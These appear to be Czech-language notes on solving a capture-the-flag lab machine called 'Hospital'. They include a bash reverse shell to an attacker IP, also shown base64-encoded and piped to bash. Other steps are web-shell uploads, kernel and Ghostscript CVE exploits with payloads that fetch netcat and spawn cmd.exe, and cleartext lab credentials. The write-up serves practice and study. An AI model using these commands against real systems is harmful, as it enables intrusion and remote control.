# Hospital

-nmap -> XY portů -> 80, 8080

-Na 8080 login, vytvořit účet

-Lze uploadovat, nebere php

-Dirbuster -> složka uploads -> není permissions

-Nebere .php -> nahrát **powny-shell.phar** a spustit\


**Vytvořit reverse shell, zakodovat do base 64 a pomocí echo nahrát**

```
sh -i >& /dev/tcp/10.10.14.236/4444 0>&1

c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjM2LzQ0NDQgMD4mMQ==

echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjM2LzQ0NDQgMD4mMQ== | base64 -d | bash
```

-Zjištění verze systému (uname -r) a nalezení exploitu na daný kernel ([https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post\_page-----791ad6dd24ed--------------------------------](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----791ad6dd24ed--------------------------------))

-Přesun přes wget, spuštění, root, nalezení hashe pro drwilliams&#x20;

$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/\
\
-Uživatelské údaje ke stránce na portu 80\
drwilliams\
qwe123!@#

-Píše si s drbrownem, má upravit .eps které spravuje GhostScripts

-Využít exploit na GhostScripts ([https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection))

-Nakopírovat si nc.exe ([https://github.com/int0x33/nc.exe/](https://github.com/int0x33/nc.exe/))

**Spustit http server**\
python3 -m http.server 9000

**Vytvořit .eps s payloadem**\
python3 CVE\_2023\_36664\_exploit.py --inject --payload "curl 10.10.14.236:9000/nc64.exe -o nc.exe" --filename file.eps

-Odpovědět na mail a do přílohy poslat vygenerovaný .eps = nahraje se netcat

**Vygenerovat další payload**\
python3 CVE\_2023\_36664\_exploit.py --inject --payload "curl 10.10.14.236 4444 -e cmd.exe" --filename file.eps

-Spustit netcat na 4444 a poslat nový payload = spustí se cmd přes předem nahraný netcat\
\
-Otevře se reverse shell na drbrowna, ten má v ghostscripts.bat heslo k RDP (Remmina)

drbrown\
chr!$br0wn

-Na ploše user flag

-Přesunout se do /xampp/htdocs

**Nahrát shell**\
-spustit http server ze složky kde je powny-shell.phar (port 8083)\
-nakopírovat shell -> curl 10.10.16.68:8083/powny-shell.phar -o shell.php\
-jelikož se nahrává do /htdocs, soubor je dostupný pod portem 80\
-redirect -> [https://10.10.11.241/shell.php](https://10.10.11.241/shell.php)\
-root flag na /Users/Administrator/Desktop

